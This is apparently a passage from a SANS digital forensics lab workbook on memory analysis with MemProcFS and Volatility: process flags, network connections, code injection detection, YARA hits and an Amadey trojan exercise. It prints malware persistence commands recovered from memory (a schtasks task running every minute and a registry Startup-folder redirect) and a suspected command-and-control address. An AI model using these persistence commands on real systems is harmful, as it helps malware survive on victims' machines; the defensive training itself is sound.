MemProcFS.exe -forensic 1 -device rd01-memory.img

The newly mounted M: drive should be available immediately. However, the ﬁrst time you run MemProcFS, you might see a terms
of use pop-up for Microsoft Internet Symbol Store access. If a pop-up displays, select Yes in the dialog.

© 2023 SANS Institute

.

21

Tip
MemProcFS uses the Internet-based Microsoft Symbols Server to download the proper symbol table to parse memory data
structures. If you see errors related to the downloading of symbols, your Virtual Machine likely does not have a connection to
the Internet. MemProcFS may be missing some data for the memory image until this issue is corrected.

.

Minimize (do not exit) the command terminal and transition to the M:\ drive within Windows File Explorer.

In previous labs you analyzed processes and process objects using Volatility. Here we will walk you through memory analysis
using MemProcFS.
1. Open and review M:\sys\proc\proc.txt to ﬁnd the suspicious processes previously identiﬁed in the process tree. Notice the
extra information provided for each process.

22

© 2023 SANS Institute

.

Solution

2. Gain some practice using the extra information present for each process to quickly identify interesting characteristics:

MemProcFS Process Flags
• 32: Process is 32-bit on 64-bit Windows
• E: Process is NOT found in EPROCESS list (memory corruption, drift or unlink)
• T: Process is terminated

.

• U: Process is user-account (non-system user)
• *: Process is outside standard paths.

• Which processes present in the memory image are 32-bit?
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

23

Solution
The "32" ﬂag on iexplore.exe, FoxitPDFReader, and subject_srv.exe indicates they are 32-bit processes. A lot of
malware in the wild is still 32-bit based so it is worth giving extra scrutiny to these types of processes.

• Review the ﬂags and user columns for the child processes of STUN.exe (PID 1912). What information do they provide for
the three msedge.exe processes?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution

.

• The msedge.exe processes are all terminated
• They are running outside of standard paths
• They are running under the SYSTEM account context (this is unusual for a browser process)
• It is also very clear here that the msedge.exe processes all have an unexpected parent (STUN.exe)

3. Many of the output ﬁles in MemProcFS are also available in CSV format to facilitate ﬁltering or ingestion into a database.
Open the ﬁle M:\forensic\csv\process.csv in Timeline Explorer to get a different view of processes (double-clicking on the
ﬁle typically works or open directly with Timeline Explorer). If the columns are too wide, use Tools -> Reset column widths or
CTRL-R to improve the view.

24

© 2023 SANS Institute

.

Tip
The contents of the M:\forensic folder take a short while to generate when memory is ﬁrst parsed. If you do not yet see the
expected ﬁles present, be patient and refresh the folder a few minutes later. If there are still no ﬁles present, check your
initial MemProcFS command-line to make sure it includes the -forensic 1 argument.

Filter the Name column for msedge. Which process has a full command-line? Why?
________________________________________________________________
________________________________________________________________
Solution
msedge.exe PID 2524 is the only currently running process with a command-line present. It is very common for exited

.

processes to no longer have a pointer to their Process Environment Block where the process command-line is recorded.

4. Now open M:\forensic\csv\handles.csv in Timeline Explorer to review process handles. Do a global ﬁlter (top right "Find"
dialog in Timeline Explorer) for the name of the previously discovered Named Pipe, ShellEx_16293. Can you ﬁnd any other
related processes with a handle to this object?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

25

Solution
• PID 4 - System
• PID 1912 - STUN.exe
• Unfortunately the Named Pipe doesn't really provide much additional information, like other compromised processes.
The System process is where operating system (Kernel) code is run and hence many handles are duplicated there
when they relate to kernel activities (like networking). While not helpful here, it is a good best practice to attempt to
pivot on something you know to ﬁnd other related items.

Clear your ﬁlter and perform a global ﬁlter for Mup. Microsoft describes MUP devices like this: "multiple UNC provider (MUP)
is a kernel-mode component responsible for channeling all remote ﬁle system accesses using a Universal Naming
Convention (UNC) name to a network redirector (the UNC provider) that is capable of handling the remote ﬁle system
requests." MUP devices are tracked in the handles table and are particularly useful for identiﬁcation of SMB protocol usage
like mapped shares. In what interesting network connections has this system participated?
________________________________________________________________

.

________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

26

© 2023 SANS Institute

.

Solution
• 172.16.6.12\c$ (H:)
• ﬁle01\shieldbase-share (S:)
• 172.16.4.5\Installers (M:)
• rd10.shieldbase.com\c$ (X:)
• 172.16.6.12\c$\Users (L:)
• rd04.shieldbase.com\c$ (Q:)
• Notice the results also include the drive letter the share was mapped to, which could be useful for things like searches

.

for speciﬁc command-lines typed by a user or attacker.

What process is associated with the most interesting Mup devices?
________________________________________________________________

© 2023 SANS Institute

.

27

Solution
• PID 2056 (svchost.exe) has handles to all of the interesting Mup devices on this system.
• If you look up the command line for this process you will see it loads code related to "LanmanWorkstation", which is
the Windows service responsible for maintaining client network connections to remote systems using the SMB
protocol: C:\Windows\System32\svchost.exe -k NetworkService -p -s LanmanWorkstation . Focusing on handles
within this process could be a different way to ﬁnd similar information in future examinations.

.

Analyze Network Artifacts
We will complete our review of process objects with a focus on networking data resident in memory. Open the MemProcFS ﬁle M:
\forensic\csv\net.csv in Timeline Explorer to review the resident network sockets and UDP/TCP connections for the RD01

computer.

Note
MemProcFS also includes a text ﬁle representation of the data named M:\sys\net\netstat.txt , but the CSV version is more
suited to analysis using Timeline Explorer.

28

© 2023 SANS Institute

.

Common Networking Ports
• 389: Lightweight Directory Access Protocol (LDAP)
• 443: HTTP over SSL/TLS
• 445: SMB (Microsoft File Sharing)
• 3262: F-Response implementation within Stark Research Labs
• 3389: Microsoft Remote Desktop Protocol
• 5985: PowerShell Remoting
• 8000: Velociraptor
• 8080: Alternative port for HTTP (Similar to port 80)
• 9182: Prometheus system monitoring (legitimate SRL tool)

1. If you perform a quick review of the data you will see a lot of uninteresting socket information. Filter the State column for

.

CLOSED, ESTABLISHED, and SYN_SENT to narrow your focus.

Add a global ﬁlter (top-right "Find" dialog) for 8080. SRL employs a web proxy on this port. Outbound traﬃc from SRL to
external entities should be using port 8080 to the proxy server at 172.16.4.10.
Review the Process column. Do any process names seem unusual to be communicating on the network?
________________________________________________________________

© 2023 SANS Institute

.

29

Solution
• Slack and Google Chrome seem like reasonable processes to be communicating external to the SRL network, but
explorer.exe seems less likely to be normal. Explorer.exe is the user desktop, and while (nearly) anything is possible in
an operating system as complicated as Windows, it would be the prime candidate for further research.
• As often is the case, additional context is needed to make a complete decision. You might remember in previous
exercises we recorded suspicious children of explorer.exe (msedge.exe) and Microsoft Defender tagging explorer.exe
for malicious activity. This is why analysis gets easier as we gather more information!

• C hallenge: Change your ﬁlter to -8080 (8080 with a minus sign in front) to see everything except rows matching 8080.

.

What connections could be good candidates for a malware beacon? Why?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

30

© 2023 SANS Institute

.

Solution
• 104.16.89.20:443 (explorer.exe PID 6664)
• 185.199.108.153:443 (explorer.exe PID 6664)
• 104.16.248.249:443 (explorer.exe PID 6664)
• 34.160.144.191:443 (explorer.exe PID 6664)
• A classic malware beacon would exhibit external network connections over a web port (typically 80 or 443). In
these examples we have several attempted connections over port 443. Notice that none of them were successful
due to their State value being "SYN_SENT." This is because they were not using the SRL proxy and hence were
likely blocked at the ﬁrewall. While it is possible these connections are related to legitimate applications that were
not proxy-aware, the fact they are tied to an explorer.exe process we are already suspicious of makes them even
more interesting.

2. We have previously identiﬁed interesting RDP connections in the event logs of this system. Clear any previous global ﬁlters
and replace with a ﬁlter for 3389. Document any RDP connections and their directionality (which system initiated the RDP
connection).

.

________________________________________________________________
________________________________________________________________
Solution
• RDP connection inbound from 172.16.30.23
• RDP connection o utbound to 172.16.7.15

Extra credit: Reference the SRL network map and make an argument why one of the RDP connections is particularly
suspicious.

© 2023 SANS Institute

.

31

________________________________________________________________
Solution
• RDP connection inbound from 172.16.30.23 is coming from the VPN subnet and is a legitimate connection path for
remote SRL workers.
• RDP connection o utbound to 172.16.7.15 is to another workstation on the network. Workstation to workstation
communications are rare in most networks, and them using the RDP protocol is even rarer. Added to that, the
associated process is explorer.exe. Why would the user's desktop process be establishing a connection to another
workstation over RDP? Very strange!
3. Port 445 is used for SMB over IP traﬃc and is commonly an indication of mounted ﬁle shares (and lateral movement). What
IP addresses are connected to using this port? Can you tell what direction the connections were?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• 172.16.6.18 (Inbound)
• 172.16.4.5 (Outbound)

• 172.16.6.14 (Outbound)

.

• 172.16.6.12 (Outbound)

• 172.16.6.20 (Outbound)
• We have already discovered via multiple artifacts that mapping shares is a likely lateral movement technique used by
the attackers. This would be yet another way to see that behavior in action.
• Do not forget each TCP connection includes a creation time! If you were to look at any of these remote systems for
more insight into attacker activity, you already have a time period to pivot around.
• Finally, a fun fact is you can match the outbound systems here with those found in the handles part of this exercise.
We love when multiple artifacts all tell us the same thing!

32

© 2023 SANS Institute

.

Lab Takeaways
• Evidence continues to point to STUN.exe being malicious
• STUN.exe and its msedge.exe children were all running with the all-powerful Local System privileges
• A named pipe, ShellEx_16293, was associated with STUN.exe, providing a possible indicator of compromise to look for
on other systems
• The tdungan account was tied to suspicious activity by using the "net use" command to map a C$ admin share on
172.16.6.12
• Multiple suspicious msedge.exe processes also ran under the tdungan account context
• This extra information should make us more conﬁdent tdungan is a compromised account
• Network connections in memory indicate a large amount of lateral movement inbound and outbound from this system:
• RDP connection inbound from 172.16.30.23
• RDP connection outbound to 172.16.7.15
• SMB connection inbound from 172.16.6.18
• SMB connection outbound to 172.16.4.5
• SMB connection outbound to 172.16.6.12
• SMB connection outbound to 172.16.6.14
• SMB connection outbound to 172.16.6.20
• Attempted external connections not using the web proxy were identiﬁed:
• 104.16.89.20:443 (explorer.exe PID 6664)
• 185.199.108.153:443 (explorer.exe PID 6664)

.

• 104.16.248.249:443 (explorer.exe PID 6664)
• 34.160.144.191:443 (explorer.exe PID 6664)

• These IPs would make excellent indicators of compromise to see if any other systems in the network have also attempted
connections (ﬁrewall and proxy logs would be ideal places to search)

© 2023 SANS Institute

.

33

Lab 3.3: Code Injection
Objectives
1. Identify code injection and ﬁlter out false positives
2. Learn basic ﬁeld triage of suspicious memory sections
3. Practice with two world-class tools for advanced memory analysis, Volatility and MemProcFS

Lab Preparation
This lab will be completed in both your 508 SIFT LINUX VM a nd your 508 Windows VM. Please follow the instructions closely.

Lab Questions
Volatility: Detecting Code Injection
This part of the lab is a continuation of the previous memory analysis exercises.
Launch the 508 SIFT LINUX VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics
Elevate privileges, change directory to the /cases/memory folder, and verify that the rd01-memory.img ﬁle is present.

.

sudo su

cd /cases/memory

ls

34

© 2023 SANS Institute

.

Note
It is recommended to work under a root context ( sudo su ) as some tools or plugins may not operate as expected without
elevated permissions.

1. Code Injection Detection with Malﬁnd
• In the Linux SIFT Workstation, run the Volatility windows.malﬁnd plugin on the rd01-memory.img image to search for
injected memory pages. There will be a lot of output, so output the data to a text ﬁle.
cd /cases/memory

mkdir malfind-rd01

vol.py -f rd01-memory.img -o ./malfind-rd01 windows.malfind --dump > malfind.txt

Once processing is complete, run the following grep command to get a preview of the processes identiﬁed having unusual
memory pages:
grep PAGE malfind.txt

• Which processes were identiﬁed by malﬁnd? (list name and PID). Which process has the most pages identiﬁed?
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

35

Solution
• lsass.exe (PID 692)
• MsMpEng.exe (PID 3236)
• Ec2Conﬁg.exe (PID 3276)
• PhoneExperienc (PID 9172)
• OUTLOOK.EXE (PID 9000)
• MsMpEng.exe has the most number of pages identiﬁed. This process is part of the Microsoft Defender security
suite so it is unsurprising that some of its memory pages look unusual.

• Open the output text ﬁle and review the contents, ignoring the MsMpEng.exe hits (security software often mimics the

.

same indicators as malware).
less malfind.txt

Tip
When using the less tool to review ﬁle contents, type the letter "q" to quit when you are ﬁnished.

Which process seems most likely to be injected (other than MsMpEng.exe)?? What are the indicators that lead you to
believe this?
________________________________________________________________
________________________________________________________________

36

© 2023 SANS Institute

.

Solution
• lsass.exe (PID 692)
• The lsass process appears to have a 64-bit function prologue present in a memory page with
PAGE_EXECUTE_READWRITE privileges and not mapped to a ﬁle on disk (this last part is implied it is a check
malﬁnd does for us). A function prologue indicates "code" which is the ﬁnal check which must be completed to
identify code injection with malﬁnd.
• LSASS stands for Local Security Authority Subsystem Service, and it is one of the most critical processes running
on a system. It would be extremely unusual for it to have any pages with the dangerous EXECUTE_READWRITE
privileges.
• The remaining processes (other than MsMpEng.exe) all appear to have repetitive, garbage data in the identiﬁed

.

memory sections.

• Now review the contents of malfind.txt focusing on the MsMpEng.exe hits. Do you see any likely injected memory
pages in that process's memory locations?
________________________________________________________________

© 2023 SANS Institute

.

37

Solution
Absolutely! The MsMpEng.exe process has several pages which exhibit 64-bit function prologues similar to those seen
in lsass.exe. The difference here is in context. We know that security software (including tools like EDR) often ends up
looking like malware due to the invasive techniques necessary to monitor activity. Since Stark Research Labs is known
to be running Microsoft Defender, we can likely ignore these hits.

2. Field triage of suspicious memory sections
• Making a determination of code / no-code can often be challenging when we are only presented with a snippet of the
memory page contents. By using the --dump option with Malﬁnd, we directed the tool to dump any identiﬁed pages to

.

ﬁles in the malfind-rd01 folder. In this step, we will review this output for further insights.
ls -l /cases/memory/malfind-rd01

Tip
The " ls -l " in this command is using a lower-case "L", not the number "1"

Notice the ﬁlenames are named according to process id (PID). Recalling that lsass.exe was PID 692, we can run strings
against the fully extracted memory pages to gain more context.
strings -8 /cases/memory/malfind-rd01/pid.692*

Tip
This command extracts ASCII strings by default (8 characters or longer with the "-8" argument). We would also
typically want to run the command again to extract Unicode strings using the option strings -e l , but in this case
there are no Unicode strings present.

38

© 2023 SANS Institute

.

Review the extracted human-readable strings of the suspicious lsass.exe memory sections. Do the strings seem
indicative of things that might be referenced in a Windows program?
Yes / No (pick one)

Solution
• Yes, the strings present reference dynamically linked library ﬁles (.dll) and Windows API function names that
could be part of an executable's import or export table.
• This should only be considered a "ﬁeld-triage" ﬁrst step. The most complete way to determine if there is code
would be to open the ﬁle in a disassembler and reverse engineer it, which is out of scope for this class. You could

.

also run anti-virus or YARA signatures against these ﬁles to automate known malware detection.

• Optional homework: Choose one or more of the other PIDs present in malﬁnd-rd01 folder and perform the same steps.
Example:
strings -8 /cases/memory/malfind-rd01/pid.9000*

Are there any strings indicative of code in the other processes?
________________________________________________________________

© 2023 SANS Institute

.

39

Solution
Only the pages extracted from MsMpEng.exe (PID 3236) have any strings present. Those present in MsMpEng.exe
pages appear to largely be related to the opcodes used in 64-bit function prologues.

MemProcFS: Detecting Code Injection
This part of the lab will use the 508 Windows VM
Launch the 508 Windows VM and log in. You can suspend any other VMs to save system resources.
• LOGIN = SANSDFIR
• PASSWORD = forensics
Open an administrator command terminal, change directory to G:\SRL_Evidence\memory , and perform a directory listing
cd /d G:\SRL_Evidence\memory

.

dir /B

Start MemProcFS with the rd01-memory.img ﬁle (the value after "-forensic" is the number one):
MemProcFS.exe -forensic 1 -device rd01-memory.img

40

© 2023 SANS Institute

.

The newly mounted M: drive should be available immediately. However, the ﬁrst time you run MemProcFS, you might see a terms
of use pop-up for Microsoft Internet Symbol Store access. If a pop-up displays, select Yes in the dialog.

.

Note
MemProcFS uses the Internet-based Microsoft Symbols Server to download the proper symbol table to parse memory data
structures. If you see errors related to the downloading of symbols, your Virtual Machine likely does not have a connection to
the Internet. MemProcFS may be missing some data for the memory image until this issue is corrected.

Minimize (do not exit) the command terminal and transition to the M:\ drive within Windows File Explorer

© 2023 SANS Institute

.

41

.
1. Review FindEvil Output in the Baseline Image
FindEvil output in MemProcFS can identify a wide range of very advanced memory attacks, but these advanced detections
also suffer from many false positives. To gain practice with "knowing normal", we will start with a quick review of FindEvil
output from a baseline Windows 11 system. There is no malicious content in this memory image, so it allows us to
understand (at least a small part) of what might be normal for this operating system.
• Open the text ﬁle G:\Precooked\memory\Win11_baseline_findevil.txt in Notepad++ or your favorite text editor. Given
this was from a known clean system, all entries should be considered false positives. What process is responsible for the
most number of "dangerous" RWX entries?
________________________________________________________________

42

© 2023 SANS Institute

.

Solution
• Ec2Conﬁg.exe PID 9840 has the most PRIVATE_RWX entries. This is an Amazon Web Services process running on
most SRL systems.
• MsMpEng.exe would have likely been the winner here, but MemProcFS automatically ﬁlters out Microsoft Defender
due to the large number of false positives it presents.

• What is the most common alert type seen in this FindEvil output?

.

________________________________________________________________

© 2023 SANS Institute

.

43

Solution
PRIVATE_RX is the most common alert type seen here. READEXECUTE privileges are common in memory, but what is
unusual is having executable page permissions in private process memory. Most memory pages in private memory
are instantiated with READWRITE privileges, which makes sense for items being read and written to in the stack, heap,
and data ﬁles. Although by looking at this baseline, you can see there are clearly many exceptions to this rule. This is
why ﬁnding injection can be quite challenging!

2. Review FindEvil Output for the RD01 System

.

We now have the opportunity to compare MemProcFS FindEvil output with what we previously found using the Volatility
suite.

Open the MemProcFS output ﬁle M:\forensic\csv\findevil.csv generated by mounting the rd01-memory.img ﬁle. Doubleclicking the ﬁle should open it for review within Timeline Explorer.
• What processes identiﬁed with THREAD anomalies are most interesting? What makes them anomalous?
________________________________________________________________
________________________________________________________________

44

© 2023 SANS Institute

.

Solution
• Both msedge.exe PID 2524 and explorer.exe PID 6664 were reported to have threads running outside of Image
Mapped Memory (THREAD: NO_IMAGE). This is unusual because Image Mapped Memory is where EXEs and DLLs
typically reside, and hence should be where most normal code is executed using threads.
• Both processes are also tagged with THREAD: SYSTEM_IMPERSONATION. This means they have a thread running
with Local System privileges, which would be quite unusual for a browser process (msedge.exe) and the user
desktop (explorer.exe).
• The THREAD: SYSTEM_IMPERSONATION for svchost.exe PID 4308 is more likely to be a false positive because it is
not unusual for some services to need to run code as Local System.

• Filter for PID 2524 to gain more context around ﬁndings for the process. What entries are present providing more support
for this being a suspicious process?

.

________________________________________________________________

© 2023 SANS Institute

.

45

Solution
• msedge.exe PID 2524 has four pages with Read/Write/Execute privileges in its Private Memory (PRIVATE_RWX).
These permissions can be very dangerous and are left behind by many different types of code injection. However,
as we have already seen, this indicator also has false positives so the ﬁnal check would be to check each
associated memory page address for the existence of code.
• The PRIVATE_RX memory sections could also be interesting, but are not nearly as strong of an indicator as RWX.

• Filter for PID 6664 to gain more context for that identiﬁed process. What entries are present providing more support for
this being a suspicious process? Document the Address ranges for pages we would want to review for the presence of

.

code.

________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

46

© 2023 SANS Institute

.

Solution
• We previously looked at the interesting THREAD alerts for this process.
• Process ID 6664 (explorer.exe) has ﬁve pages with Read/Write/Execute privileges in its Private Memory
(PRIVATE_RWX). Given dangerous permissions in an unusual location (Private memory), these locations would be
a good place to look for the presence of injected code:
• 0x2e81000
• 0x7c14000 - 0x7c17000
• The PRIVATE_RX memory sections are also unusual, but are not nearly as strong of an indicator as RWX.
• The PE_PATCHED entry for amsi.dll could also be interesting. This indicator is prone to false positives, but that
speciﬁc DLL supports the very important Antimalware Scan Interface (AMSI) capability of Microsoft Defender.
Several AMSI bypasses in the wild rely upon patching amsi.dll in memory so it could turn out to be an interesting
indicator to look for on other systems.

• Find and open one of the suspicious memory sections in the M:\name\explorer.exe-6664\vmemd folder. This folder

.

contains representations of the memory locations tracked by the VAD tree (and sometimes page tables) as individual
.vvmem ﬁles. We would go to this folder to see the contents of anything found within the FindEvil output, including

suspected injected memory sections. Look for the ﬁle 0x0000000007c10000.vvmem , which encompasses one of the ranges
of addresses found in the last question. Right-click on the ﬁle and Open with HxD to open the ﬁle in a hex editor. Take a
brief look, but unfortunately there is not much to see in hex view. Next, open a new command terminal and use the
following command to see the strings (ASCII and Unicode) available in the memory section:
bstrings -f M:\name\explorer.exe-6664\vmemd\0x0000000007c10000.vvmem -m 8

Do you see anything in this memory section which would lead you to believe it might contain code?
________________________________________________________________

© 2023 SANS Institute

.

47

Solution
• Yes, the strings present in this memory section all but guarantee code is present. You will see error messaging,
DLLs referenced, and strings related to 64-bit function prologues.
• Remember that if you ﬁnd code present in a RWX section within private memory, you have very likely found code

.

injection. We would want to get this ﬁle to a reverse engineer for a more detailed analysis.

• Clear any existing ﬁlters and review the other processes identiﬁed by the FindEvil module.
After a quick review, consider ﬁltering out Type PE_PATCHED entries, which can be very prone to false positives.

48

© 2023 SANS Institute

.

What additional processes are present in the "FindEvil" output that were previously discovered in earlier memory forensic
steps?
________________________________________________________________

Solution

.

________________________________________________________________

• STUN.exe (PID 1912) - PRIVATE_RWX/RX sections
• lsass.exe (PID 692) - PRIVATE_RWX sections

© 2023 SANS Institute

.

49

MemProcFS + YARA
One of the most exciting upgrades to MemProcFS is the addition of YARA signature scanning. Marrying the power of YARA
signature detection with detailed memory analysis can make it trivial to detect even extremely stealthy malware variants. You
won't ﬁnd 0-day malware with this technique, but you will also likely ﬁnish your entire career without ever being the ﬁrst to see a 0day attack. This is a great example of working smarter, not harder.
In your 508 Windows VM, exit out of any existing MemProcFS sessions by using the CTRL-C in the command terminal running
MemProcFS (you might need to press the key combination multiple times). Start a new analysis for the same memory image, now
including YARA signature scanning (the accepting of the elastic license uses the excellent Elastic Security YARA signature set built
into MemProcFS):
MemProcFS.exe -forensic 1 -device rd01-memory.img -license-accept-elastic-license-2.0

Elastic Security maintains a GitHub repository of over 1000 YARA rules, each capable of detecting multiple variants of the most
frequently seen malware on the planet. This repository is now available in MemProcFS. You can ﬁnd the signatures here.
When the -license-accept-elastic-license-2.0 option is included in your MemProcFS command-line, you will see any YARA
signature matches within the FindEvil output. Open the updated

M:\forensic\csv\findevil.csv for this memory image and

answer the following questions.

Tip
YARA scanning processes in memory takes time. While MemProcFS is very fast, be patient when adding this option. It could
take several minutes for the ﬁndevil.csv and other forensic output ﬁles to become available. You will need to refresh the folder
to see the ﬁles when they become available. If you would like to get started immediately, a precooked version of the ﬁle is

.

located in G:\Precooked\memory\rd01_ﬁndevil_yara.csv. You can check the percent progress of the forensic collection by
opening the ﬁle M:\forensic\progress_percent.txt.

• Which processes were tagged due to YARA signature hits?
________________________________________________________________
________________________________________________________________

50

© 2023 SANS Institute

.

________________________________________________________________
________________________________________________________________
Solution
• lsass.exe (PID 692)
• STUN.exe (PID 1912)
• msedge.exe (PID 2524)
• explorer.exe (PID 6664)
• At this point, this should be no surprise. But isn't this much easier than the process we previously followed?

• To learn more about the YARA signatures that were found, open M:\forensic\csv\yara.csv . Notice the Match Index column

.

maps to the number in square brackets [1] after each YARA match in findevil.csv .

© 2023 SANS Institute

.

51

Solution

• Optional Homework: To go to the source, use contextual clues (e.g. CobaltStrike) to identify the likely Elastic Security YARA
signature. Then search for terms in the description provided within MemProcFS.
Use a web browser to open the following YARA signature: Windows_Trojan_CobaltStrike.yar.
Within your web browser, type CTRL-F for "ﬁnd" and search for f0b627fc . This should provide you with the raw YARA

.

signature for one of the hits discovered within the STUN.exe process.

52

© 2023 SANS Institute

.

.

Solution

Optional Homework: Analyze FindEvil Output for Amadey Malware
Amadey is a proliﬁc trojan linked to years of attacks and multiple ransomware groups including LockBit. It is also regularly seen
delivering additional payloads like RedLine Stealer to extract credentials, crypto wallets and credit card data. The memory image
we have to work with is from an initial infection and hence has a wealth of malicious content.
In your 508 Windows VM, exit out of any existing MemProcFS sessions by pressing CTRL-C in the command terminal running
MemProcFS (you might need to press the key combination multiple times).
Start MemProcFS with the amadey.img memory image (the value after "-forensic" is the number one):
MemProcFS.exe -forensic 1 -device G:\SRL_Evidence\memory\amadey.img -license-accept-elastic-license-2.0

1. Start your investigation with a review of process information. Open M:\sys\proc\proc.txt and test yourself. What
suspicious processes are present?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

53

________________________________________________________________
________________________________________________________________
Solution
• In this case, the process names alone give a strong indicator of unusual processes being present. Hopefully you were
suspicious of the processes beginning with Sun07. But did you also identify tkools.exe?
• The process tree can only get us so far. To be more effective, we need full-command lines and evidence of unusual
memory pages.

M:\forensic\csv\findevil.csv

.

2. Analyze the results returned by the FindEvil module:

Tip
FindEvil data takes a short while to generate. If you do not yet see the ﬁle present, be patient and refresh the folder a
minute or two later. If there are still no ﬁles present, check your initial MemProcFS command-line.

• Which processes were identiﬁed via YARA signature hits?
________________________________________________________________
________________________________________________________________

54

© 2023 SANS Institute

.

Solution
• tkools.exe (PID 320)
• Sun07610e6b216b74271.exe (PID 6856)

• The PROC_DEBUG ﬁndings are interesting in the FindEvil output. This tag indicates a non-SYSTEM process with the
SeDebugPrivilege ﬂag enabled. This privilege is dangerous and one of the standard mechanisms for attaching to another
process for code injection. Interestingly, this heuristic catches most of the processes we have been looking at. Look closely
at these ﬁndings. What executable of interest have we not talked about yet?
________________________________________________________________
Solution
• setup_install.exe (PID 5792)
• You might have already identiﬁed this process as interesting, but there is so much going on in this memory image
that malware can sometimes hide in the noise. Finding the same ﬁles/malware in different ways makes sure we

.

don't miss anything!

• Open M:\forensic\csv\process.csv to check the full path of setup_install.exe. Does this location add or remove support
for this being a suspicious process? What else can you ﬁnd in that same folder?
________________________________________________________________

© 2023 SANS Institute

.

55

Solution
• \Users\Admin\AppData\Local\Temp\7zS827304C6\setup_install.exe
• Anything running from a Temp folder is interesting. Pivoting on this folder name is another way to ﬁnd the
suspicious Sun* processes, making it clear that setup_install.exe is related.

• Now go back to the FindEvil output to focus on the indicator for Private Memory pages with RWX permissions,
PRIVATE_RWX. Document process IDs (PIDs) you would want to follow up on:
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

56

© 2023 SANS Institute

.

Solution
• In this case, both the strange process names and the PRIVATE_RWX pages present are good indicators of
suspicious activity. Explorer.exe was also documented as it is rare to see that process with RWX pages.
• explorer.exe (PID 3332)
• Sun078a90701e.exe (PID 5640)
• Sun07610e6b216b74271.exe (PID 6856)
• Sun07923b89b57.exe (PID 5892)
• Note that these "Sun*" processes are only a subset of those previously identiﬁed with the PROC_DEBUG ﬂag.

3. We would likely want to iterate through the PRIVATE_RWX pages to verify if any have code in them (similar to the process
used with Volatility malﬁnd, ﬁnding code in any of these pages would be a strong indication of code injection). A good
example can be seen in PID 6856. Go to the folder M:\name\Sun07610e6b216-6856\vmemd . Right-Click on the ﬁle
0x0000000000400000.vvmem and Open with HxD (a hex editor). This ﬁle can be diﬃcult to spot, so don't give up!

From the FindEvil output:

.

vmemd

Navigate to the

folder for that process and open the memory location:

© 2023 SANS Institute

.

57

Does this memory section contain code?
________________________________________________________________
Solution
The memory section has a MZ header indicating code is present. Therefore, this is injected memory since it is in a memory
page with RWX permissions not mapped to a ﬁle on disk. Your next step would be reverse engineering the contents to see

.

what it does.

4. Go to the process folder for another of the suspicious ﬁles, M:\name\tkools.exe-320 .

58

© 2023 SANS Institute

.

.
• Find and open the ﬁle win-cmdline.txt and document from where this process was loaded.
________________________________________________________________

© 2023 SANS Institute

.

59

Solution
• C:\Users\Admin\AppData\Local\Temp\2303a34fa8\tkools.exe
• This is just a different way to get some of the information available in MemProcFS ﬁles like

M:

\forensic\csv\process.csv

• Open the ﬁle M:\name\tkools.exe-320\modules\tkools.exe\import.txt to review what functions are present in the
import address table for this executable. Do you see any functions that give indications of the capabilities of this
software?
________________________________________________________________
________________________________________________________________

.

________________________________________________________________
________________________________________________________________

60

© 2023 SANS Institute

.

Solution
This is a bit out of scope for this class, but it does demonstrate the depth of information available for each process.
This import table includes a massive number of functions often abused by malware: LoadLibraryA, GerProcAddress,
VirtualAlloc, Suspend/ResumeThread, Sleep, WriteProcessMemory, RegSetValueExA, HttpSendRequestA, and so many
more! If you move forward on the reverse engineering side of things, spotting dangerous functions like these will
become second nature.

5. To review strings of just the executable we would use the ﬁle M:\name\tkools.exe-320\modules\tkools.exe\pefile.dll , but
to get strings from both the code and data regions, we should use M:\name\tkools.exe-320\minidump\minidump.dmp . We will
use the excellent bstrings tool to target speciﬁc strings via regular expressions in the latter ﬁle.

bstrings -p

.

• First, open a command terminal and take a moment to review the built-in regular expressions in bstrings:

• Now extract IP version 4 addresses from minidump.dmp:
bstrings -f M:\name\tkools.exe-320\minidump\minidump.dmp --lr ipv4

• What IP address would be a good candidate for further investigation?
________________________________________________________________

© 2023 SANS Institute

.

61

Solution

.

The strings containing IP address 185.215.113.45 are highly unusual and should be investigated.

• If you have Internet access, do a search for the IP address discovered above using VirusTotal: https://
www.virustotal.com/gui/home/search. Select the "Details" and "Relations" sections of the results to get more information
on this malware.

62

© 2023 SANS Institute

.

.

Solution

• Now extract Windows ﬁle paths from the M:\name\tkools.exe-320\minidump\minidump.dmp ﬁle.
bstrings -f M:\name\tkools.exe-320\minidump\minidump.dmp --lr win_path

There are some very interesting paths and ﬁlenames present in this process memory. What persistence mechanism is
present that was previously covered in class? Can you tell how frequently it executes?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

63

Solution
• There is evidence of a scheduled task pointing to tkools.exe
• "C:\Windows\System32\schtasks.exe" /Create /SC MINUTE /MO 1 /TN tkools.exe /TR "C:
\Users\Admin\AppData\Local\Temp\2303a34fa8\tkools.exe" /F
• The task is set up to run every minute (/SC MINUTE /MO 1). Running schtasks.exe /Create /? in a command
terminal can help you identify all of the arguments in use.

Tip
The bstrings tool has recently been ported to .NET6 making it also available on Linux! You can ﬁnd it in your Linux
SIFT workstation by typing bstrings

.

• Advanced: There is actually a second persistence mechanism in this output that is less frequently used by attackers. Can
you ﬁnd it?
________________________________________________________________

64

© 2023 SANS Institute

.

Solution
• EG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v Startup /t REG_SZ
/d C:\Users\Admin\AppData\Local\Temp\2303a34fa8\
• The ﬁrst letter, "R", is cut off in the string, but the overall command would add a value to the User Shell Folders key.
This is a stealthy persistence mechanism used to execute code during the user logon process.

6. MemProcFS extracts interesting forensic data from memory, including information on Windows Services and Scheduled
Tasks. Open the ﬁle M:\forensic\csv\tasks.csv and ﬁnd the entry for the scheduled task you just found within process
strings. When was the task created?
________________________________________________________________
Solution

.

The scheduled task for tkools.exe was created on 2022-06-03 09:20:22

7. There is clearly much more to analyze within the amadey.img memory image. Use the skills learned in the last few exercises
to continue the investigation on your own. As an example, see if you can ﬁnd the malware beacon IP addresses in the M:
